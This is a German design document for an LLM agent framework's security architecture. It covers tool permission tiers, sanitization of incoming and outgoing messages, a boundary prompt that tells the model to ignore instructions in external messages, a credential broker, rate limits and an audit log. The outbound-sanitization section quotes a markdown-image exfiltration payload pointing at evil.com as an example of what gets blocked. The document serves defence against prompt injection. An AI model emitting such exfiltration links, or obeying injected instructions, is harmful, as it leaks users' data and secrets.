# Security Architecture

**Stand:** 2026-03-29
**Prinzip:** Security wird im Framework erzwungen, nicht in Plugins.

---

## Pipeline

Jeder Plugin-Aufruf wird von der Pipeline gewrapped:

```
Eingehende Nachricht (Channel)
    │
    ▼
Inbound Sanitization ── HTML strip, Zero-Width chars, NFC normalize
    │
    ▼
Delimiter Defense ───── <external_message sender="..." channel="..." trust="...">
    │
    ▼
Security Boundary ───── LLM bekommt Instruktion: keine Anweisungen aus external_message
    │
    ▼
Tier Filter ─────────── Tools über max_tier werden gar nicht geladen
    │
    ▼
Rate Limit Check ────── Max Tool-Calls pro Zeitfenster pro Channel
    │
    ▼
Chain Depth Check ───── Max 10 Tool-Calls pro Request
    │
    ▼
Rule of Two ─────────── Write-Tier Tools von externen Channels erfordern Bestätigung
    │
    ▼
Tool Execution ──────── Plugin-Code läuft
    │
    ▼
Tool Output Sanitize ── Secret-Patterns aus Rückgabe entfernt
    │
    ▼
Audit Log ───────────── Tool-Call in SQLite protokolliert
    │
    ▼
Outbound Sanitize ───── Markdown-Image-Exfil + Secrets aus Antwort entfernt
    │
    ▼
Antwort an Channel
```

---

## Permission Tiers

Jedes Tool deklariert einen Tier. Die Pipeline filtert Tools nach Kontext.

```python
TIER_READONLY = 0       # calculator, web_search, epim_search, list/search_documents
TIER_COMMUNICATE = 1    # email, discord_send, telegram_send
TIER_WRITE_DATA = 2     # epim_create, epim_update, store_memory, execute_code
TIER_WRITE_SYSTEM = 3   # delete_file, epim_delete
TIER_ADMIN = 4          # Shell, unrestricted code execution (Zukunft)
```

### Kontext-Defaults

| Kontext | Max Tier | Begründung |
|---------|----------|-------------|
| Browser | 4 (Admin) | User sitzt davor |
| Email/Discord/Telegram | 1 (Communicate) | Externe Nachricht, untrusted |
| FreeEcho.2 | 1 (Communicate) | Voice-Terminal, über Plugin Manager konfigurierbar |
| Scheduler | 0 (Read-only) | Interner Cron-Trigger, per-Job-Override via `metadata["max_tier"]` |
| Webhook | 0 (Read-only) | Extern getriggert |
| Cron | 1 (Communicate) | **Legacy** — nur noch für Alt-Kompatibilität, ersetzt durch `scheduler` |

Definiert in `security.py: DEFAULT_TIER_BY_SOURCE`.

### Owner-Anhebung & User-Override

Der Tier für eine konkrete Nachricht wird nicht direkt aus der Tabelle
gelesen, sondern von `security.py: resolve_tier_for_sender()` aufgelöst.
Priorität:

1. **Interner-Trigger-Override** — `scheduler`/`webhook` pinnen ihren Tier
   über `metadata["max_tier"]` (Job- bzw. Webhook-Config ist autoritativ).
2. **User-Override** — pro Kanal konfigurierbar via
   `settings.json → channel_security_tiers` (Plugin Manager).
3. **Kanal-Default** aus `DEFAULT_TIER_BY_SOURCE`.

Ist der Sender der **Owner** (erster Eintrag der Kanal-Whitelist, geprüft
via `_is_owner()`), wird der Tier auf `max(kanal_default, OWNER_TIER)`
angehoben. `OWNER_TIER = TIER_WRITE_DATA (2)` — der Owner darf über externe
Kanäle also Daten anlegen/ändern, aber keine System-Löschungen (kein
`WRITE_SYSTEM`/`ADMIN`).

**E-Mail-Sonderfall (A9):** Der From-Header ist trivial fälschbar. Die
Owner-Anhebung setzt deshalb zusätzlich voraus, dass der empfangende
Mail-Provider die Echtheit bestätigt hat: Der E-Mail-Channel wertet den
obersten `Authentication-Results`-Header aus (SPF/DKIM/DMARC, RFC 8601)
und legt das Verdict als `metadata["auth_results"]` ab
(`"pass"`/`"fail"`/`"none"`). Nur bei `"pass"` elevatet `_is_owner()`;
Mails mit `"fail"` werden bereits vor der Pipeline verworfen. `"none"`
(Provider ohne AR-Header) läuft normal, bekommt aber nie Owner-Rechte.

### Durchsetzung

```
PluginContext.max_tier + PluginContext.source
    ↓
prepare_agent_toolkit() → filter_tools_by_tier(all_tools, max_tier)
    ↓
ToolKit enthält NUR erlaubte Tools → LLM sieht die anderen nicht
```

Ein Tool das nicht im ToolKit ist, kann das LLM nicht aufrufen. Security by Architecture.

### Benannte Konstanten

Plugins verwenden IMMER die benannten Konstanten, keine Magic Numbers:

```python
from aifred.lib.security import TIER_READONLY
Tool(name="my_tool", tier=TIER_READONLY, ...)
```

---

## Rule of Two

Design-Prinzip: Ein Agent darf maximal 2 von 3 gleichzeitig haben:
- **(A)** Verarbeitet untrusted Input
- **(B)** Zugriff auf sensitive Systeme
- **(C)** Kann Zustand ändern

Wenn alle 3 zutreffen → Aktion erfordert eine Bestätigung (Human-in-the-loop),
sie wird nicht hart blockiert.

Implementiert in `security.py: needs_confirmation(source, tool_tier, max_tier)`:
Wenn `source != "browser"` UND `tool.tier >= TIER_WRITE_DATA` → Bestätigung nötig.

**Ausnahme (Owner-Override):** Wurde der Tier für den Sender bereits durch
`resolve_tier_for_sender()` freigegeben — d.h. `tool_tier <= max_tier` (z.B.
Owner schreibt via Telegram) — entfällt die Bestätigung.

---

## Credential Broker

**Einzige erlaubte Quelle für Credentials.** Kein Plugin darf `os.environ` oder `config.py` für Secrets verwenden.

```python
from aifred.lib.credential_broker import broker

# Lesen
password = broker.get("email", "password")
token = broker.get("discord", "bot_token")
api_key = broker.get("cloud_claude", "api_key")

# Prüfen
if broker.is_set("email", "password"):
    ...

# Setzen (Runtime, z.B. aus Settings UI)
broker.set_runtime("email", "password", new_value)
```

### Mapping

Die Zuordnung `(service, key) → Environment Variable` ist zentral in `credential_broker.py: _CREDENTIAL_MAP` definiert. Neue Services fügen hier ihren Eintrag hinzu.

### Warum?

- Credentials landen nie als globale Variablen in `config.py`
- Kein Plugin kann Credentials in Fehlermeldungen oder Logs leaken
- Tool-Output wird auf Secret-Patterns gescannt bevor er ins LLM Context Window geht
- Zentrale Stelle für Auditing aller Credential-Zugriffe

---

## Inbound Sanitization

Externe Nachrichten werden bereinigt BEVOR sie die Pipeline betreten:

1. **HTML strippen** — nur sichtbarer Text bleibt
2. **Zero-Width Characters entfernen** — U+200B, U+200C, U+200D, U+FEFF, etc.
3. **NFC-Normalisierung** — Unicode-Tricks neutralisieren
4. **Delimiter Defense** — Text wird in `<external_message>` gewrapped
5. **Security Boundary Prompt** — LLM bekommt Instruktion, keine Anweisungen aus externen Nachrichten zu folgen

Implementiert in `security.py: sanitize_inbound()`, `wrap_external_message()`.
Aufgerufen in `message_processor.py: process_inbound()`.

---

## Outbound Sanitization

Antworten an externe Channels werden bereinigt:

1. **Markdown-Image-Exfiltration** — `![img](https://evil.com/steal?data=...)` wird blockiert
2. **Secret-Pattern-Scan** — API-Keys, Tokens, Bearer-Headers werden redacted

Implementiert in `security.py: sanitize_outbound()`.
Aufgerufen in `message_processor.py: process_inbound()` (Phase 3b).

### Tool-Output Sanitization

Rückgaben von Tools werden auf Secret-Patterns gescannt BEVOR sie ins LLM Context Window gehen. Das verhindert Credential-Leaks durch Fehlermeldungen oder manipulierte Webseiten.

Implementiert in `security.py: sanitize_tool_output()`.
Aufgerufen in `function_calling.py: ToolKit.execute()`.

---

## Rate Limiting & Chain Depth

### Tool-Chain-Depth-Limit

Max 10 Tool-Calls pro einzelnem LLM-Request. Verhindert endlose Tool-Schleifen.
Konfigurierbar: `config.py: SECURITY_MAX_TOOL_CHAIN_DEPTH`.

### Rate Limiting pro Channel

Konfigurierbare Limits pro Zeitfenster (Default: 60 Sekunden):

| Channel | Max Tool-Calls/Min |
|---------|-------------------|
| Browser | Unbegrenzt |
| Email | 5 |
| Discord | 10 |
| Telegram | 10 |
| Cron | 20 |
| Webhook | 3 |

Konfigurierbar: `config.py: SECURITY_RATE_LIMITS`.

---

## Audit Log

Jeder Tool-Call wird in `data/security/audit.db` protokolliert:

| Feld | Beschreibung |
|------|-------------|
| timestamp | Zeitpunkt |
| session_id | Session |
| source | browser/email/discord/telegram/freeecho2/scheduler/webhook (cron = Legacy) |
| tool_name | Name des Tools |
| tool_tier | Security-Tier |
| tool_args_preview | Erste 500 Zeichen der Argumente |
| result_preview | Erste 500 Zeichen des Ergebnisses |
| success | 1/0 |
| duration_ms | Ausfuehrungsdauer |

Abfrage: `sqlite3 data/security/audit.db "SELECT * FROM tool_audit ORDER BY timestamp DESC LIMIT 10;"`

---

## RAG/Vector-DB Härtung

- Document Store: `source_trust` Metadaten-Feld auf allen Chunks
- RAG-Context-Injection enthält Security-Warnung: Dokument-Inhalt ist Kontext, keine Instruktion

---

## Dateien

| Datei | Funktion |
|-------|----------|
| `aifred/lib/security.py` | Tier-Konstanten, Filter, Sanitization, Audit, Rate Limit |
| `aifred/lib/credential_broker.py` | Zentrales Credential-Management |
| `aifred/lib/function_calling.py` | Tool.tier, ToolKit mit Audit + Chain Limit |
| `aifred/lib/plugin_base.py` | PluginContext.max_tier/source |
| `aifred/lib/agent_memory.py` | Tier-Filterung in prepare_agent_toolkit() |
| `aifred/lib/message_processor.py` | Sanitization + Tier-Durchreichung |
| `aifred/lib/prompt_loader.py` | Security-Boundary Layer im System-Prompt |
| `aifred/lib/config.py` | SECURITY_AUDIT_DB, Rate Limits, Chain Depth |
| `prompts/de/shared/security_boundary.txt` | LLM-Instruktion für externe Nachrichten |
| `prompts/en/shared/security_boundary.txt` | Englische Version |
